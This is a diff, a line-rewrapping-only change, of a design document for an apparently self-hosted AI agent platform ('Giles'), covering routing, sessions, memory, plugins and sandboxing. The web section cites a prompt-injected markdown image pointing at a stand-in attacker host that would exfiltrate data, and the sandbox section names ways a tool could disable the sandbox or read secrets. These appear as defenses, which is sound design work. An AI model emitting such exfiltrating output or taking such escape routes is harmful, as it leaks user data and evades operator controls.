@@ -102,9 +102,9 @@ can't claim another channel's identities.
 
 A channel may report other ids for the same sender in `InboundMessage.sender_aliases`; WhatsApp
 reports both the phone number and the LID, since group participants usually appear only by LID
-([Baileys JIDs](https://baileys.wiki/concepts/jids)); when it can't learn the number, the LID is
-the identity. The core keys on the canonical id (`sender`)
-and treats a message as from a known identity if the sender or any alias matches.
+([Baileys JIDs](https://baileys.wiki/concepts/jids)); when it can't learn the number, the LID is the
+identity. The core keys on the canonical id (`sender`) and treats a message as from a known identity
+if the sender or any alias matches.
 
 Identity links map identities to users and live in SQLite. User records and roles live in TOML in
 the current layout; where Giles stores them is decided with their web UI (section 11.2). (Multi-user
@@ -187,8 +187,8 @@ For each kind there is:
 1. The trait, used by the core.
 2. Native implementations compiled into the core, behind Cargo features.
 3. An adapter in the core that implements the trait for an out-of-process component: `Remote*`
-   adapters over gRPC for providers and channels, and an MCP client adapter for toolsets
-   (section 7.10).
+   adapters over gRPC for providers and channels, and an MCP client adapter for toolsets (section
+   7.10).
 4. A plugin SDK (`giles-plugin-sdk`) that serves a channel implementation as a plugin binary.
 
 v1 doesn't promise that one component can ship either built-in or as a plugin; each component is one
@@ -217,8 +217,8 @@ Traits use hand-written domain types from the `giles-types` crate. `prost`-gener
 only in `giles-proto`, the `Remote*` adapters, and the plugin SDK, which convert at the gRPC
 boundary by moving fields rather than cloning.
 
-Traits are used as `dyn` objects, so async methods go through `#[async_trait]` (one boxed future
-per call).
+Traits are used as `dyn` objects, so async methods go through `#[async_trait]` (one boxed future per
+call).
 
 Public enums in `giles-types` and the SDK (`Block`, `CompletionEvent`, `ChannelEvent`,
 `ToolCallEvent`, ...) are `#[non_exhaustive]`, so adding a variant isn't a breaking change for
@@ -291,8 +291,7 @@ get the base service (section 8.2).
 
 ### 4.5 How the Parts Interact
 
-One inbound message, end to end. A scheduled job enters at the session step instead of the
-channel.
+One inbound message, end to end. A scheduled job enters at the session step instead of the channel.
 
 ```mermaid
 sequenceDiagram
@@ -381,14 +380,14 @@ Rules:
   }
   ```
 
-  An `InboundMessage` becomes a `User` message (`Text` plus `Image`/`Audio`/`Document` blocks).
-  An assistant turn's `Text` blocks become `OutboundMessage`s.
+  An `InboundMessage` becomes a `User` message (`Text` plus `Image`/`Audio`/`Document` blocks). An
+  assistant turn's `Text` blocks become `OutboundMessage`s.
 
 Media:
 
 - Each attachment is shown to the model with a reference, e.g. `[media:a3f9 voice.ogg audio/ogg]`.
-- A tool input may refer to an attachment as `{"$media": "a3f9"}`. Before the call, the core
-  hands the file to the MCP server (section 7.10).
+- A tool input may refer to an attachment as `{"$media": "a3f9"}`. Before the call, the core hands
+  the file to the MCP server (section 7.10).
 - The core tool `send_attachment(media, caption?)` sends a stored attachment, or media a tool
   returned, to the current conversation.
 - Providers declare the media types they accept. Anything else reaches the model only as its text
@@ -414,18 +413,18 @@ The web UI lists the routes in order and adds, edits, removes, and moves them; a
 the next inbound message, with no restart. Each change is validated like configuration: the channel
 instance and the agent must exist, and a route that no message could ever reach is refused, either
 because an earlier route matches everything it does (a duplicate is the same case) or because the
-change would put a route before one it would hide. Refusing was chosen over a warning because such
-a route is nearly always a mistake, and moving routes one place at a time always passes through
-valid lists. A route that stopped working anyway, say because its agent directory was deleted, or
-one imported from `giles.toml` (which never checked), is kept and flagged on the page and in the
-log at startup. A web chat started with a chosen agent goes to that agent ahead of every route
-(section 8.7).
+change would put a route before one it would hide. Refusing was chosen over a warning because such a
+route is nearly always a mistake, and moving routes one place at a time always passes through valid
+lists. A route that stopped working anyway, say because its agent directory was deleted, or one
+imported from `giles.toml` (which never checked), is kept and flagged on the page and in the log at
+startup. A web chat started with a chosen agent goes to that agent ahead of every route (section
+8.7).
 
 Transition: `giles.toml` used to hold the routes as `[[routes]]`. The first start that finds no
-import recorded in the database imports them, in order, after the same checks (an invalid rule
-stops startup, naming its key), and records that it did. After that `giles.toml`'s `[[routes]]`
-are never read again, not even if every route is later deleted; Giles warns at every start while
-the file still has them.
+import recorded in the database imports them, in order, after the same checks (an invalid rule stops
+startup, naming its key), and records that it did. After that `giles.toml`'s `[[routes]]` are never
+read again, not even if every route is later deleted; Giles warns at every start while the file
+still has them.
 
 In-message addressing (`@name`) is not in v1.
 
@@ -447,13 +446,13 @@ conversation id): each WhatsApp chat, email thread, IRC query, and web chat has 
 ### 6.3 Turns
 
 - At most one turn runs per session.
-- Every turn has exactly one requester: the sender of the message that started it, or the creator
-  of a runtime job. Config jobs (`agent.toml`) have no requester. The requester decides which tools
-  are allowed (section 6.4) and who may answer approvals.
-- Inbound messages are rows in the `inbox` table (section 11.4) from the moment they are acked.
-  A message that arrives while a turn runs stays `queued` there, so a restart loses nothing.
-  Messages from someone other than the requester never join that turn; they start their own turn
-  later. Consecutive messages from one person may form one turn. Job prompts never merge into user
+- Every turn has exactly one requester: the sender of the message that started it, or the creator of
+  a runtime job. Config jobs (`agent.toml`) have no requester. The requester decides which tools are
+  allowed (section 6.4) and who may answer approvals.
+- Inbound messages are rows in the `inbox` table (section 11.4) from the moment they are acked. A
+  message that arrives while a turn runs stays `queued` there, so a restart loses nothing. Messages
+  from someone other than the requester never join that turn; they start their own turn later.
+  Consecutive messages from one person may form one turn. Job prompts never merge into user
   messages.
 - New messages from the requester during a turn follow the agent's `busy_mode`:
   - `steer` (default): at each tool-batch boundary, the requester's new messages are appended as
@@ -481,8 +480,8 @@ that breaks this.
 - An assistant message with N `ToolUse` blocks is stored together with N result slots, in one
   transaction.
 - A slot is filled by the tool's result. If the turn ends any other way, the slot gets a synthetic
-  error result: `cancelled`, `denied`, `skipped`, `iteration limit`, `interrupted`, or
-  `truncated` (a `ToolUse` cut off by `Stop(MaxTokens)`).
+  error result: `cancelled`, `denied`, `skipped`, `iteration limit`, `interrupted`, or `truncated`
+  (a `ToolUse` cut off by `Stop(MaxTokens)`).
 - At startup the core fills every empty slot with `interrupted`, marks the inbox rows of turns that
   were running as `unknown`, and tells each requester "Interrupted by a restart; resend if needed."
   Nothing is replayed, so a tool with side effects never runs twice.
@@ -504,8 +503,8 @@ the agent's allowlist.
 
 The session keeps its tool list even when a toolset's tools change: a toolset that goes down
 (section 7.6) or drops a tool on `list_changed` (section 7.9) leaves the list as it was. A call to a
-tool that is no longer served gets the error result "tool unavailable". New sessions get the
-current list.
+tool that is no longer served gets the error result "tool unavailable". New sessions get the current
+list.
 
 Approval: an agent's `ask` globs list tools that need approval before each call (empty by default).
 An MCP server may also ask mid-call through elicitation (section 7.10); the core handles it the same
@@ -527,8 +526,8 @@ way.
   denied; an expired prompt can't be answered, so the user asks again. A restart denies every
   pending approval (the startup recovery in section 6.3 fills its slot with `interrupted`).
 - A new message from the requesting user that isn't an approval reply denies the pending request.
-  The tool result reads "Not approved. The user said: ...", and the turn continues with that
-  message visible to the model. Messages from other people wait in the inbox for their own turns.
+  The tool result reads "Not approved. The user said: ...", and the turn continues with that message
+  visible to the model. Messages from other people wait in the inbox for their own turns.
 
 ### 6.5 Tool Names
 
@@ -570,10 +569,10 @@ everything after it
 - `system`, assembled at session start and again after compaction (section 6.8), never per turn:
   1. `SOUL.md`
   2. Skill names and descriptions
-  3. The memory snapshot: the core memories visible in the session, each with its id (below).
-     Shared memories come first, then the session's own: a user's in a DM, the group's in a group.
-     In a DM, the user's `USER.md` follows. Participants' `USER.md` and private memories are never
-     loaded in a group, so the agent can't repeat them to others there.
+  3. The memory snapshot: the core memories visible in the session, each with its id (below). Shared
+     memories come first, then the session's own: a user's in a DM, the group's in a group. In a DM,
+     the user's `USER.md` follows. Participants' `USER.md` and private memories are never loaded in
+     a group, so the agent can't repeat them to others there.
 - Messages: each stored user message carries a prefix with the time it was sent, in the user's
   timezone (DM) or the agent's (group), next to the `[sender]` prefix in groups. The current time
   never goes in `system`.
@@ -609,12 +608,12 @@ scope.
   fact only after they compact or start anew. This also keeps the prompt cache stable.
 - Caps: `memory_cap` (default 2,200 characters) caps the total characters of core memories in each
   scope: shared, each user, and each group, per agent. Memories that aren't core are not capped. The
-  cap is checked inside the write transaction, so concurrent sessions can't break it. An add or
-  edit that would exceed it fails, and the error gives the overflow and lists that scope's core
-  memories with their sizes, so the model can shorten, forget, or demote some in its next call. A
-  change that doesn't grow a scope is always allowed, so a scope left over a lowered cap can still
-  shrink. Marking a core memory shared or private moves it between scopes and is checked in the
-  target scope.
+  cap is checked inside the write transaction, so concurrent sessions can't break it. An add or edit
+  that would exceed it fails, and the error gives the overflow and lists that scope's core memories
+  with their sizes, so the model can shorten, forget, or demote some in its next call. A change that
+  doesn't grow a scope is always allowed, so a scope left over a lowered cap can still shrink.
+  Marking a core memory shared or private moves it between scopes and is checked in the target
+  scope.
 - Tools: four core tools, with closed JSON schemas. `memory_add(content, core?, shared?)` returns
   the new id; `core` and `shared` default to false. `memory_edit(id, content?, core?, shared?)`
   changes at least one of them and replaces the whole content: whole-entry replace was risky when
@@ -623,9 +622,9 @@ scope.
   included. Every result shows the affected memory with its id and flags, and for a core change the
   usage of each scope it touched. Content is trimmed, can't be empty, and is at most 1,000
   characters; the error messages say what to do.
-- Recall: the query is plain words, each quoted and OR-ed, with no query syntax. Hits are ranked
-  by bm25, the most recently updated first on ties; `limit` defaults to 10 and is at most 50. Each
-  hit shows its id, flags, content, and creation and update times. The tool is read-only and
+- Recall: the query is plain words, each quoted and OR-ed, with no query syntax. Hits are ranked by
+  bm25, the most recently updated first on ties; `limit` defaults to 10 and is at most 50. Each hit
+  shows its id, flags, content, and creation and update times. The tool is read-only and
   parallel-safe.
 - Search: `memory_search` is FTS5 over transcripts only, kept current by triggers on `messages`.
   It's scoped to the current context: in a DM, that user's DM sessions with this agent; in a group,
@@ -640,10 +639,10 @@ group, any participant can use the group's private memories. Who speaks varies p
 group's prompt treats shared memories as not writable and shows no usage for them. In a DM or job
 session, a requester other than the session's user can't use its private memories.
 
-A config job has no requester, so there is nobody whose private memories it could use: its tools
-see and write shared memories only, and what it writes has no owner. Its prompt is built per
-session, not per turn, and can't tell it from the user's own job session, so the prompt still lists
-that user's core memories, which the job's tools can neither read nor change.
+A config job has no requester, so there is nobody whose private memories it could use: its tools see
+and write shared memories only, and what it writes has no owner. Its prompt is built per session,
+not per turn, and can't tell it from the user's own job session, so the prompt still lists that
+user's core memories, which the job's tools can neither read nor change.
 
 `USER.md` is written only by people, by hand or in the web UI, never by an agent, and is loaded only
 in that user's DMs. What an agent learns about a user goes into that agent's private memories for
@@ -652,10 +651,10 @@ existing files stay on disk, ignored, and nothing is migrated.
 
 ### 6.8 Context Overflow
 
-When a session's prompt approaches the model's context limit, the core summarizes older history
-into a summary record. The prompt then uses the summary plus recent messages. Original messages
-stay in SQLite. Starting a new session after an idle period is an opt-in setting per agent. The
-summary is written by the agent's `compaction_model` (section 6.10).
+When a session's prompt approaches the model's context limit, the core summarizes older history into
+a summary record. The prompt then uses the summary plus recent messages. Original messages stay in
+SQLite. Starting a new session after an idle period is an opt-in setting per agent. The summary is
+written by the agent's `compaction_model` (section 6.10).
 
 ### 6.9 Output
 
@@ -718,8 +717,8 @@ ask_to = "deliver_to"         # optional; without it, `ask` tools are denied (se
   reply to it has context.
 - Each job's last run time is kept in the `job_runs` table, keyed by the job's `id`. Missed runs
   while the core was down are coalesced into one run at startup.
-- Timezone: the job's user, else the agent's `timezone`, else the default time zone in
-  `giles.toml` (section 11.2), else the system timezone.
+- Timezone: the job's user, else the agent's `timezone`, else the default time zone in `giles.toml`
+  (section 11.2), else the system timezone.
 
 Every proactive send (job output, approval prompts, login codes) goes through the `outbox` table
 (section 11.4). It's retried with backoff until the channel accepts it, so output from a job that
@@ -756,9 +755,9 @@ renames the directories, and renames the instance's config (in the current layou
 `[<kind>.<old>]` table in `giles.toml`, section 11.2). At startup, the core refuses to start a new
 instance whose name doesn't match any known data while an unused old name has data, and points to
 the rename command. An instance removed on purpose, whose data stays, is listed in
-`[core] retired_instances` (section 11.2), which the check ignores. Renaming an instance that has
-no `component` key keeps its component by writing `component = "<old>"`, since the component
-defaults to the instance name.
+`[core] retired_instances` (section 11.2), which the check ignores. Renaming an instance that has no
+`component` key keeps its component by writing `component = "<old>"`, since the component defaults
+to the instance name.
 
 ### 7.3 Discovery and Enablement
 
@@ -845,8 +844,8 @@ clean up:
 User-run plugins reached over TCP, with optional TLS and a bearer token or OAuth client credentials.
 
 - Plain TCP to a non-loopback address is refused unless the instance sets `insecure = true`. TLS
-  also authenticates the plugin to the core; without it, anyone on the path could inject messages
-  or tool results.
+  also authenticates the plugin to the core; without it, anyone on the path could inject messages or
+  tool results.
 - Unreachable at startup or later: Giles runs degraded and retries with backoff. While a toolset is
   down, new sessions don't get its tools; existing sessions keep them, and calls to them fail
   (section 6.4). A down channel simply has no traffic.
@@ -905,9 +904,9 @@ Each `[toolset.<instance>]` is one MCP server:
 
 - Stdio: a `command` (absolute path) with `args` and `env`, launched by the core through the sandbox
   trampoline (section 12), one sandbox per server.
-- Remote: a streamable HTTP `url`, with `auth = { bearer = ... }`. The deprecated HTTP+SSE
-  transport is not supported, and `rmcp` no longer ships a client for it. Remote servers run
-  elsewhere and aren't sandboxed by the core.
+- Remote: a streamable HTTP `url`, with `auth = { bearer = ... }`. The deprecated HTTP+SSE transport
+  is not supported, and `rmcp` no longer ships a client for it. Remote servers run elsewhere and
+  aren't sandboxed by the core.
 
 The instance name is the tool prefix: `[toolset.github]` gives `github__create_issue`.
 
@@ -948,8 +947,8 @@ Making stdio servers work under the sandbox:
 ### 8.1 Conventions
 
 - The core is always the gRPC client, over the socket pair from section 7.4. Plugins never call the
-  core; plugin-to-core messages travel only on streams the core opened. A go-plugin-style broker
-  can be added later if a feature needs plugin-initiated calls.
+  core; plugin-to-core messages travel only on streams the core opened. A go-plugin-style broker can
+  be added later if a feature needs plugin-initiated calls.
 - These contracts cover provider and channel plugins. Toolsets speak MCP instead (section 7.10).
 - Every gRPC plugin serves `giles.plugin.v1.PluginService`, `grpc.health.v1.Health`, and exactly one
   kind service.
@@ -1174,10 +1173,10 @@ or later, which includes elicitation.
 ### 8.7 Admin
 
 The core serves `giles.admin.v1.AdminService` on `<root>/run/admin.sock` (mode 0600). The `giles`
-CLI and the web admin pages are its clients: the CLI over the socket, the web admin pages
-in-process behind the web login. Every call on the socket needs the token in
-`<root>/run/admin.token` (mode 0600, outside every plugin's grants), because file modes don't
-separate the core from its plugins, which run as the same user.
+CLI and the web admin pages are its clients: the CLI over the socket, the web admin pages in-process
+behind the web login. Every call on the socket needs the token in `<root>/run/admin.token` (mode
+0600, outside every plugin's grants), because file modes don't separate the core from its plugins,
+which run as the same user.
 
 | Area     | RPCs                                                                      |
 | -------- | ------------------------------------------------------------------------- |
@@ -1209,13 +1208,13 @@ running configuration, stops its config jobs, and deletes its runtime jobs. It i
 stored route names the agent (the page lists the routes) or while the agent is working (a chat turn
 running or messages queued, or a job run in progress); the agent is taken out of the running
 configuration before its files move and checked again, and put back if work appears or the move
-fails. Its sessions, messages, and usage stay in the database, inert; creating an agent
-with the same id again reattaches them. Web chats can be started with a chosen agent, which routes
-them to it ahead of the stored routes. Who sees which agent file is one per-viewer check: the owner
-sees all of them, and `memory.db` is listed by size, not contents. Memories have their own page per
-agent (`/admin/agents/<agent>/memory`), under the visibility rules of section 6.7: each signed-in
-user sees and edits their own private memories and the shared ones (writing shared ones only as
-the owner), and the owner also sees and edits each group conversation's memories there.
+fails. Its sessions, messages, and usage stay in the database, inert; creating an agent with the
+same id again reattaches them. Web chats can be started with a chosen agent, which routes them to it
+ahead of the stored routes. Who sees which agent file is one per-viewer check: the owner sees all of
+them, and `memory.db` is listed by size, not contents. Memories have their own page per agent
+(`/admin/agents/<agent>/memory`), under the visibility rules of section 6.7: each signed-in user
+sees and edits their own private memories and the shared ones (writing shared ones only as the
+owner), and the owner also sees and edits each group conversation's memories there.
 
 The route pages (list, add, edit, remove, and reorder the routes of section 6.1) are owner-only
 admin pages too, also without RPCs: they call the core's route management in-process, and a change
@@ -1236,8 +1235,8 @@ applies to the next inbound message.
   one small first-party script for the new-agent form; no build step.
 - Rendered agent output never loads remote content: the HTML renderer drops remote images (`data:`
   and blob-store images stay), and pages send `Content-Security-Policy: img-src 'self' data:`.
-  Otherwise a prompt-injected reply like `![](https://attacker/?d=...)` would leak data with no
-  tool call.
+  Otherwise a prompt-injected reply like `![](https://attacker/?d=...)` would leak data with no tool
+  call.
 - TLS is terminated by a reverse proxy, not by Giles.
 - Login: section 3.4.
 
@@ -1264,10 +1263,10 @@ Rendering CommonMark:
 `giles-plugin-sdk` provides these renderers (on `pulldown-cmark`) so Rust plugins share them.
 
 WhatsApp uses the unofficial multi-device protocol as a linked device, written in Rust on
-`whatsapp-rust`. If that library proves unreliable, the fallback is a Go plugin on `whatsmeow`;
-only this plugin changes. Its session store lives in the plugin's data directory. Linking (QR code
-or pair code) and later logouts are reported as `ChannelStatus` (section 8.5), so the operator can
-link from the admin page or `giles status`.
+`whatsapp-rust`. If that library proves unreliable, the fallback is a Go plugin on `whatsmeow`; only
+this plugin changes. Its session store lives in the plugin's data directory. Linking (QR code or
+pair code) and later logouts are reported as `ChannelStatus` (section 8.5), so the operator can link
+from the admin page or `giles status`.
 
 Discord uses a bot account on Discord's official bot API (the Gateway for receiving, REST for
 sending), written in Rust on `twilight`. v1 handles direct messages only: the plugin asks for the
@@ -1327,9 +1326,9 @@ Giles creates and edits them:
 
 - Users: an admin adds users in the web UI.
 - Agents and their files: `agent.toml`, `SOUL.md`, and memories (section 11.3).
-- Routes from channel identities to users and agents: identity links (section 3.2) and routing
-  rules (section 6.1). Routing rules are the first of these built: they're stored in SQLite and
-  edited in the web UI.
+- Routes from channel identities to users and agents: identity links (section 3.2) and routing rules
+  (section 6.1). Routing rules are the first of these built: they're stored in SQLite and edited in
+  the web UI.
 - Component instances (providers, channels, toolsets) are headed for the web UI too, within the
   limits `giles.toml` sets; how they're managed there is not designed yet.
 
@@ -1338,12 +1337,11 @@ Where each kind of data is stored, in SQLite or in Markdown, JSONL, or other tex
 settings managed in the web UI live is open.
 
 Transition: the current implementation still reads the owner (section 1.1) and instances from
-`giles.toml`, and the multi-user design below keeps roles there and users in `user.toml`. Each
-moves to storage Giles manages as its web UI lands; the migration isn't designed, except for routes,
-which already moved: `[[routes]]` is imported once into the database and then ignored (section
-6.1). Open: the first
-login (section 3.4) needs the owner's identity, so whether some bootstrap identity stays in
-`giles.toml` is undecided.
+`giles.toml`, and the multi-user design below keeps roles there and users in `user.toml`. Each moves
+to storage Giles manages as its web UI lands; the migration isn't designed, except for routes, which
+already moved: `[[routes]]` is imported once into the database and then ignored (section 6.1). Open:
+the first login (section 3.4) needs the owner's identity, so whether some bootstrap identity stays
+in `giles.toml` is undecided.
 
 The current layout has three kinds of TOML file: `giles.toml`, `agents/<agent>/agent.toml`, and
 `users/<user>/user.toml`. Giles may create and edit `agent.toml` and `user.toml` files, for example
@@ -1440,12 +1438,12 @@ settle (500 ms), it parses and validates the whole config.
 
 - Invalid: keep running the previous config, log the error, and report it in `giles status`.
 - Valid: apply the difference. Roles, agents, and users apply to the next turn (routes already
-  change at runtime in the web UI and aren't read from these files). A changed
-  instance is restarted with its new config; a removed one is stopped; a new one is started.
+  change at runtime in the web UI and aren't read from these files). A changed instance is restarted
+  with its new config; a removed one is stopped; a new one is started.
 - `[core]` settings such as `http_listen` need a restart; the core logs that.
 
-Markdown files (`SOUL.md`, `USER.md`, job prompt files, skills) are read when a turn
-assembles its prompt, so they need no reload.
+Markdown files (`SOUL.md`, `USER.md`, job prompt files, skills) are read when a turn assembles its
+prompt, so they need no reload.
 
 ### 11.3 Agent and User Files
 
@@ -1462,22 +1460,22 @@ users/<user>/
 ```
 
 - YAML front-matter is optional; no fields are required.
-- `memory.db` holds every memory of the agent: shared, each user's, and each group's (section
-  6.7). It is its own SQLite database, not a table of `giles.db`. Memory files from earlier
-  versions (`MEMORY.md`, `users/<user>/MEMORY.md`, `groups/<instance>/<conversation>/MEMORY.md`)
-  are not read, written, or migrated.
+- `memory.db` holds every memory of the agent: shared, each user's, and each group's (section 6.7).
+  It is its own SQLite database, not a table of `giles.db`. Memory files from earlier versions
+  (`MEMORY.md`, `users/<user>/MEMORY.md`, `groups/<instance>/<conversation>/MEMORY.md`) are not
+  read, written, or migrated.
 - Conversation ids are percent-encoded in paths (`#giles` becomes `%23giles`).
 
 ### 11.4 SQLite
 
 One database, `data/giles.db`, with migrations embedded in the binary, holds everything except the
 memories: each agent keeps those in its own `agents/<agent>/memory.db` (section 6.7), opened the
-same way with its own migrations. Both run in WAL mode by
-default; `[core] journal_mode` chooses `wal`, `delete`, `truncate` or `persist` (`memory` and `off`
-are refused: they risk corruption). WAL needs shared memory, which network file systems lack, so
-the option is the way out there; changing it converts the database at the next start. Writes go
-through one writer connection, and WAL lets reads run beside it; in the other modes reads and the
-writer wait for each other and `synchronous` is `FULL`. Main tables:
+same way with its own migrations. Both run in WAL mode by default; `[core] journal_mode` chooses
+`wal`, `delete`, `truncate` or `persist` (`memory` and `off` are refused: they risk corruption). WAL
+needs shared memory, which network file systems lack, so the option is the way out there; changing
+it converts the database at the next start. Writes go through one writer connection, and WAL lets
+reads run beside it; in the other modes reads and the writer wait for each other and `synchronous`
+is `FULL`. Main tables:
 
 | Table          | Holds                                                                  |
 | -------------- | ---------------------------------------------------------------------- |
@@ -1511,10 +1509,10 @@ Per-user operations:
 
 Backups: copying a live SQLite file can capture a broken state (in WAL mode the main file is behind
 the WAL), so `giles backup <dir>` is the supported way: `VACUUM INTO` for the database and for each
-agent's `memory.db`, plus a tar
-of the TOML, Markdown, and blobs. Before applying schema migrations, the core writes the same
-snapshot to `backups/`, so a bad upgrade can be undone by restoring it with the old binary. In a
-rollback-journal mode the snapshot runs on the writer connection, so writes wait for it.
+agent's `memory.db`, plus a tar of the TOML, Markdown, and blobs. Before applying schema migrations,
+the core writes the same snapshot to `backups/`, so a bad upgrade can be undone by restoring it with
+the old binary. In a rollback-journal mode the snapshot runs on the writer connection, so writes
+wait for it.
 
 ### 11.5 Blob Store
 
@@ -1527,8 +1525,7 @@ swept.
 
 Each launched instance gets `data/plugins/<instance>/`, passed as `GILES_PLUGIN_DATA`. It's the
 plugin's only writable directory; its `TMPDIR` is inside it (section 7.4). It survives restarts and
-upgrades. The core never deletes it automatically. Remote plugins keep their
-own state.
+upgrades. The core never deletes it automatically. Remote plugins keep their own state.
 
 ### 11.7 Usage
 
@@ -1553,10 +1550,10 @@ a trampoline, `giles sandbox-exec <spec> -- <plugin>`: a fresh single-threaded p
 the Landlock ruleset (Linux) or Seatbelt profile (macOS), applies it and the seccomp filter, and
 then `exec`s the plugin. The fds from section 7.4 pass through unchanged.
 
-At startup the core checks that the sandbox works on this host (Landlock enabled, seccomp
-available, `sandbox-exec` present). If not, it reports one clear error naming the cause, instead of
-letting every plugin fail. This matters in containers: Docker's default seccomp profile allows the
-needed syscalls, but the host kernel must have Landlock enabled.
+At startup the core checks that the sandbox works on this host (Landlock enabled, seccomp available,
+`sandbox-exec` present). If not, it reports one clear error naming the cause, instead of letting
+every plugin fail. This matters in containers: Docker's default seccomp profile allows the needed
+syscalls, but the host kernel must have Landlock enabled.
 
 ### 12.2 Linux
 
@@ -1583,17 +1580,17 @@ unchanged:
   back only on `ENOSYS`; glibc 2.34 and later, for example, create threads with `clone3` and fall
   back to `clone`.
 - The syscalls under "Denied" below, and `socket()` for families not granted, fail with `EPERM`.
-- Only the native architecture. Other architectures (e.g. 32-bit `int 0x80` on x86-64) are
-  killed, so `socketcall` can't bypass the rules.
+- Only the native architecture. Other architectures (e.g. 32-bit `int 0x80` on x86-64) are killed,
+  so `socketcall` can't bypass the rules.
 - `socket()` only for granted families: none by default; `AF_INET`/`AF_INET6` when network is
   granted; `AF_UNIX` only with an explicit grant. `socketpair(AF_UNIX)` is always allowed (async
   runtimes use it).
 - Denied: `io_uring_setup`, `io_uring_enter`, `io_uring_register` (io_uring can create and connect
   sockets without the `socket` syscall), `ptrace`, `process_vm_readv`/`writev`, `bpf`,
-  `perf_event_open`, `userfaultfd`, `keyctl`, `add_key`, `request_key`, path-based `truncate`
-  (below Landlock ABI 3), and System V IPC (`shm*`, `msg*`, `sem*`) and POSIX message queues
-  (`mq_*`): Docker allows those because each container has its own IPC namespace, and the sandbox
-  has none, so they would reach every same-user process's segments and queues.
+  `perf_event_open`, `userfaultfd`, `keyctl`, `add_key`, `request_key`, path-based `truncate` (below
+  Landlock ABI 3), and System V IPC (`shm*`, `msg*`, `sem*`) and POSIX message queues (`mq_*`):
+  Docker allows those because each container has its own IPC namespace, and the sandbox has none, so
+  they would reach every same-user process's segments and queues.
 
 ### 12.3 macOS
 
@@ -1624,8 +1621,8 @@ sandbox = { network = ["tcp:443"], read = ["/opt/homebrew"], write = [] }
 - `network = true` allows all outbound IP traffic (no listening on TCP); a list of ports restricts
   it where the kernel has Landlock ABI 4 or later.
 - Config validation rejects any `read` or `write` grant that overlaps `GILES_HOME` (other than the
-  instance's own data directory) or the plugin directories. Otherwise a file-writing tool could
-  edit `giles.toml` (e.g. set `unsandboxed = true`) or read `secrets.toml`.
+  instance's own data directory) or the plugin directories. Otherwise a file-writing tool could edit
+  `giles.toml` (e.g. set `unsandboxed = true`) or read `secrets.toml`.
 - `Describe` may list `requested_grants`. They're shown in `giles status` to help the operator and
   never applied automatically.
 
@@ -1715,8 +1712,8 @@ A `Dockerfile` at the repository root builds a basic system: `giles` plus the fi
 meant for real use (the test-only echo channel plugin is left out).
 
 - Runtime base: `debian:bookworm-slim` with `ca-certificates`, `tzdata`, and `tini`.
-- `giles` and the plugin binaries go in `/usr/local/bin/`, so plugin discovery finds them on
-  `$PATH` (section 7.3) while `GILES_HOME` stays a pure data volume.
+- `giles` and the plugin binaries go in `/usr/local/bin/`, so plugin discovery finds them on `$PATH`
+  (section 7.3) while `GILES_HOME` stays a pure data volume.
 - `GILES_HOME=/data`, declared as a volume. Runs as a non-root `giles` user (uid and gid 10001).
 - Exposes port 8080. `giles.toml` must set `http_listen = "0.0.0.0:8080"` for the port to be
   reachable.
